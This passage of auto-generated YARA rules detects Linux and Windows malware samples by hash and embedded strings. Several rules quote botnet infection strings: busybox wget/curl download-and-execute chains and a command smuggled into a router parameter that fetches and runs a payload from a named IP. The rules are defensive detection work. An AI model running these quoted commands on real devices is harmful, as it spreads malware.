        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
        $s11 = "/sys/devices/system/cpu"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 101KB and
        all of them
}

rule Linux_151b49633b1bd166fc66335ae4d489bab682360a22c0e0fc0e6491855c324a59
{
    meta:
        description = "Auto ML: 151b49633b1bd166fc66335ae4d489bab682360a22c0e0fc0e6491855c324a59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB and
        all of them
}

rule Linux_9ec76f69f824dd8785fe3ad28f018c2bcfbe489a6c22bf170a04c98793f3a8ce
{
    meta:
        description = "Auto ML: 9ec76f69f824dd8785fe3ad28f018c2bcfbe489a6c22bf170a04c98793f3a8ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Linux_bd133209aa4e09f521377bc1a6d9f8dd2ac6c59e599eaa9dc5d7db62c4a2c17f
{
    meta:
        description = "Auto ML: bd133209aa4e09f521377bc1a6d9f8dd2ac6c59e599eaa9dc5d7db62c4a2c17f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 91KB and
        all of them
}

rule Linux_85732f87844ef773361db3733aa9f0dc23c4919994d940274259eb2165d8ccc4
{
    meta:
        description = "Auto ML: 85732f87844ef773361db3733aa9f0dc23c4919994d940274259eb2165d8ccc4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Linux_9d441299226de1bf8e922f1e44cfd9c6637496a4a7d3125104bf1f3a8fc2c1bd
{
    meta:
        description = "Auto ML: 9d441299226de1bf8e922f1e44cfd9c6637496a4a7d3125104bf1f3a8fc2c1bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Exec format error"
        $s2 = "Resource temporarily unavailable"
        $s3 = "Multihop attempted"
        $s4 = "Attempting to link in too many shared libraries"
        $s5 = "Cannot exec a shared library directly"
        $s6 = "Socket operation on non-socket"
        $s7 = "Protocol wrong type for socket"
        $s8 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB and
        all of them
}

rule Linux_0c74df96275e10b5b679705bcefc2f9d38f42fe5210f3bf9745e33bf505ad000
{
    meta:
        description = "Auto ML: 0c74df96275e10b5b679705bcefc2f9d38f42fe5210f3bf9745e33bf505ad000"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Linux_4c3622329109b9d63b1367b122c8365ff0835601e09f87450be8be7ded1241ec
{
    meta:
        description = "Auto ML: 4c3622329109b9d63b1367b122c8365ff0835601e09f87450be8be7ded1241ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 96KB and
        all of them
}

rule Linux_4f55b23b6f3f3c4c6db970d3c11174d91c3691c157876c91434765fadc0088bd
{
    meta:
        description = "Auto ML: 4f55b23b6f3f3c4c6db970d3c11174d91c3691c157876c91434765fadc0088bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Linux_2f00687dfc5c318afa2addc9fcbf2c428dced80741aeea07c2123cfc2f615d4f
{
    meta:
        description = "Auto ML: 2f00687dfc5c318afa2addc9fcbf2c428dced80741aeea07c2123cfc2f615d4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Linux_62be731321c14137a211cac325c4ae05db32c4e4f9a9d3cea488154857d4a1ac
{
    meta:
        description = "Auto ML: 62be731321c14137a211cac325c4ae05db32c4e4f9a9d3cea488154857d4a1ac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
        $s11 = "/sys/devices/system/cpu"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB and
        all of them
}

rule Linux_d419cf35017ea1484e070327e30dd84a68e699a93921f8ccef0fd75149ea0417
{
    meta:
        description = "Auto ML: d419cf35017ea1484e070327e30dd84a68e699a93921f8ccef0fd75149ea0417"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB and
        all of them
}

rule Linux_ab278d1446374f355effddf15b443f3720044ee0eb88779de6c9f0dbbd817077
{
    meta:
        description = "Auto ML: ab278d1446374f355effddf15b443f3720044ee0eb88779de6c9f0dbbd817077"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Linux_2f4e68f4e0f1908da771b2467c8b2c6bf02c21b7aa5dd91bad8d1f4cb5024c48
{
    meta:
        description = "Auto ML: 2f4e68f4e0f1908da771b2467c8b2c6bf02c21b7aa5dd91bad8d1f4cb5024c48"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB and
        all of them
}

rule Linux_7e97e8f3e21d2f33330deeb9e983bcb22b68fb696a215a68b3aa33169a27676e
{
    meta:
        description = "Auto ML: 7e97e8f3e21d2f33330deeb9e983bcb22b68fb696a215a68b3aa33169a27676e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "Exec format error"
        $s4 = "Resource temporarily unavailable"
        $s5 = "Multihop attempted"
        $s6 = "Attempting to link in too many shared libraries"
        $s7 = "Cannot exec a shared library directly"
        $s8 = "Socket operation on non-socket"
        $s9 = "Protocol wrong type for socket"
        $s10 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Linux_fb32444e8e73bf5c8b9f41dbba7bff0bdfc5a9d8ef9abdc71ed93dd3b8210fcb
{
    meta:
        description = "Auto ML: fb32444e8e73bf5c8b9f41dbba7bff0bdfc5a9d8ef9abdc71ed93dd3b8210fcb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "socket"
        $s2 = "linuxshell"
        $s3 = "/bin/busybox wget http://"
        $s4 = "/curl.sh -o- | sh"
        $s5 = "/wget.sh -O- | sh;/bin/busybox tftp -g "
        $s6 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://"
        $s7 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"
        $s8 = "Exec format error"
        $s9 = "Resource temporarily unavailable"
        $s10 = "Multihop attempted"
        $s11 = "Attempting to link in too many shared libraries"
        $s12 = "Cannot exec a shared library directly"
        $s13 = "Socket operation on non-socket"
        $s14 = "Protocol wrong type for socket"
        $s15 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Linux_f18a5e6ac36d4f935acb04fd40d9478926188599b076422dc3cea95bbaff699a
{
    meta:
        description = "Auto ML: f18a5e6ac36d4f935acb04fd40d9478926188599b076422dc3cea95bbaff699a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "socket"
        $s2 = "shell"
        $s3 = "linuxshell"
        $s4 = "/bin/busybox wget http://"
        $s5 = "/wget.sh -O- | sh;/bin/busybox tftp -g "
        $s6 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://"
        $s7 = "/curl.sh -o- | sh"
        $s8 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"
        $s9 = "Exec format error"
        $s10 = "Resource temporarily unavailable"
        $s11 = "Multihop attempted"
        $s12 = "Attempting to link in too many shared libraries"
        $s13 = "Cannot exec a shared library directly"
        $s14 = "Socket operation on non-socket"
        $s15 = "Protocol wrong type for socket"
        $s16 = "Socket type not supported"
        $s17 = "/sys/devices/system/cpu"
        $s18 = "_Unwind_DeleteException"
        $s19 = "__gnu_unwind_execute"
        $s20 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 159KB and
        all of them
}

rule Linux_0594bda00da8aa0d9cc1662a17100e3bf87a4fe8ca04cdc690bfee243732392e
{
    meta:
        description = "Auto ML: 0594bda00da8aa0d9cc1662a17100e3bf87a4fe8ca04cdc690bfee243732392e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "socket"
        $s2 = "shell"
        $s3 = "linuxshell"
        $s4 = "/bin/busybox wget http://"
        $s5 = "/wget.sh -O- | sh;/bin/busybox tftp -g "
        $s6 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://"
        $s7 = "/curl.sh -o- | sh"
        $s8 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"
        $s9 = "Exec format error"
        $s10 = "Resource temporarily unavailable"
        $s11 = "Multihop attempted"
        $s12 = "Attempting to link in too many shared libraries"
        $s13 = "Cannot exec a shared library directly"
        $s14 = "Socket operation on non-socket"
        $s15 = "Protocol wrong type for socket"
        $s16 = "Socket type not supported"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Windows_2a95cf92c2a17056166d5e1572462daa83a48ba278b5429098b54f3f077853d2
{
    meta:
        description = "Auto ML: 2a95cf92c2a17056166d5e1572462daa83a48ba278b5429098b54f3f077853d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SwapInt32"
        $s2 = "SwapInt64"
        $s3 = "SwapInt16"
        $s4 = "EXECUTION_STATE"
        $s5 = "RegistryValueKind"
        $s6 = "CryptoStreamMode"
        $s7 = "DeleteSubKeyTree"
        $s8 = "GetTempFileName"
        $s9 = "SocketType"
        $s10 = "SetThreadExecutionState"
        $s11 = "Delete"
        $s12 = "set_UseShellExecute"
        $s13 = "DeleteValue"
        $s14 = "CLIPP.exe"
        $s15 = "CryptoConfig"
        $s16 = "DownloadString"
        $s17 = "get_ExecutablePath"
        $s18 = "GetTempPath"
        $s19 = "RemoteCertificateValidationCallback"
        $s20 = "RegistryKeyPermissionCheck"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB and
        all of them
}

rule Linux_a17fa8a28f85fbc6e48d33cc8c702e28c011c46ee12667c2ac37701ad6bf7034
{
    meta:
        description = "Auto ML: a17fa8a28f85fbc6e48d33cc8c702e28c011c46ee12667c2ac37701ad6bf7034"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Linux_96343e0a497957effebc3e8ad220f990aee579324aeb61d67b577f3d7feec21f
{
    meta:
        description = "Auto ML: 96343e0a497957effebc3e8ad220f990aee579324aeb61d67b577f3d7feec21f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB and
        all of them
}

rule Linux_cff626c230bfdd7ded30560a2323cf76a8a8729d9dba853f2049c12076914509
{
    meta:
        description = "Auto ML: cff626c230bfdd7ded30560a2323cf76a8a8729d9dba853f2049c12076914509"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB and
        all of them
}

rule Linux_be19eded4943fb573f85d1a2081292784641bd15b6eb0203c598da8bc6b4af87
{
    meta:
        description = "Auto ML: be19eded4943fb573f85d1a2081292784641bd15b6eb0203c598da8bc6b4af87"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 22KB and
        all of them
}

rule Linux_406aecfd2cd7bf9ad2fcea90491ffa1584e0be5d5cd913ee30ae9e9f98defa97
{
    meta:
        description = "Auto ML: 406aecfd2cd7bf9ad2fcea90491ffa1584e0be5d5cd913ee30ae9e9f98defa97"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Linux_5d8c4036ab1b11255caca154f60896b367ccb69af6029be1574d20cd2c2ef7a0
{
    meta:
        description = "Auto ML: 5d8c4036ab1b11255caca154f60896b367ccb69af6029be1574d20cd2c2ef7a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 19KB and
        all of them
}

rule Linux_e5e4789718c575a5585f2a1c88c97a68276faa474f067abdb9f3fdbbae174af3
{
    meta:
        description = "Auto ML: e5e4789718c575a5585f2a1c88c97a68276faa474f067abdb9f3fdbbae174af3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "143.198.228.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Linux_0115d9aec427447d63e245cad0099c19f11f9d6cb49ab675eef9388bdd33a997
{
    meta:
        description = "Auto ML: 0115d9aec427447d63e245cad0099c19f11f9d6cb49ab675eef9388bdd33a997"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_313abb0639fff4cb358915a766755edc2815bc91e028bc8c94b1809549590f09
{
    meta:
        description = "Auto ML: 313abb0639fff4cb358915a766755edc2815bc91e028bc8c94b1809549590f09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 22KB and
        all of them
}

rule Linux_52993fdd2984a7bf45f9e624e72d6e5671148c9a6a14c584c034f51737e5f9b0
{
    meta:
        description = "Auto ML: 52993fdd2984a7bf45f9e624e72d6e5671148c9a6a14c584c034f51737e5f9b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "143.198.228.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 49KB and
        all of them
}

rule Windows_bf08bc7a3d6d63ad432afa395ad885537b8a6fc35afdabb63fe414aa14bb1a31
{
    meta:
        description = "Auto ML: bf08bc7a3d6d63ad432afa395ad885537b8a6fc35afdabb63fe414aa14bb1a31"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Christmas.exe"
        $s2 = "kernel32.dll"
        $s3 = "get_MetadataToken"
        $s4 = "RSACryptoServiceProvider"
        $s5 = "System.Security.Cryptography"
        $s6 = "AesCryptoServiceProvider"
        $s7 = "MD5CryptoServiceProvider"
        $s8 = "CryptoConfig"
        $s9 = "ICryptoTransform"
        $s10 = "CryptoStream"
        $s11 = "CryptoStreamMode"
        $s12 = "CreateDecryptor"
        $s13 = "GetPublicKeyToken"
        $s14 = "CreateEncryptor"
        $s15 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s16 = "1.0.0.0"
        $s17 = "qUixhfno89GaDHKsEu.zhaTMy0BSqrctN5tsj+QTcvre9l8npuRcHIB3v+tE3XDB9IQrymQvlMZgj`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]"
        $s18 = "SUsSystem.Runtime.InteropServices.CharSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s19 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s20 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 571KB and
        all of them
}

rule Linux_94104f303717e8c60a653fd132fbdc17ddfe3bf5b396626ed8e0e22a0a024817
{
    meta:
        description = "Auto ML: 94104f303717e8c60a653fd132fbdc17ddfe3bf5b396626ed8e0e22a0a024817"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "143.198.228.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Linux_581a0fb0805c2d63a309a3853139bca7372c956bf0de57e54ad58e25c0595297
{
    meta:
        description = "Auto ML: 581a0fb0805c2d63a309a3853139bca7372c956bf0de57e54ad58e25c0595297"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Linux_abb770269c81132c7a5349e7a6e3e378d929d72a9feb888685d0e10af983a7cc
{
    meta:
        description = "Auto ML: abb770269c81132c7a5349e7a6e3e378d929d72a9feb888685d0e10af983a7cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "shell"
        $s5 = "fdevalvex"
        $s6 = "wget-log"
        $s7 = "deexec"
        $s8 = "sefaexec"
        $s9 = "dakuexecbin"
        $s10 = "Execution"
        $s11 = "furasshu"
        $s12 = "/usr/libexec/openssh/sftp-server"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Linux_e2e5cb864d68ac88688d630c05e87a8decdcaa1a18654eed1f0709b31122d062
{
    meta:
        description = "Auto ML: e2e5cb864d68ac88688d630c05e87a8decdcaa1a18654eed1f0709b31122d062"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "shell"
        $s5 = "fdevalvex"
        $s6 = "wget-log"
        $s7 = "deexec"
        $s8 = "sefaexec"
        $s9 = "dakuexecbin"
        $s10 = "Execution"
        $s11 = "furasshu"
        $s12 = "/usr/libexec/openssh/sftp-server"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 105KB and
        all of them
}

rule Linux_00f0abcfcc0c4b64f259fffba3c99a0e56d612e0ff6bc048ffd41ccf8f2ccba1
{
    meta:
        description = "Auto ML: 00f0abcfcc0c4b64f259fffba3c99a0e56d612e0ff6bc048ffd41ccf8f2ccba1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 191KB and
        all of them
}

rule Linux_8162fd0add0beebdb9f8f97a0d8afd6676e0641e083a5bfa7e9bb7c9f6638b50
{
    meta:
        description = "Auto ML: 8162fd0add0beebdb9f8f97a0d8afd6676e0641e083a5bfa7e9bb7c9f6638b50"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
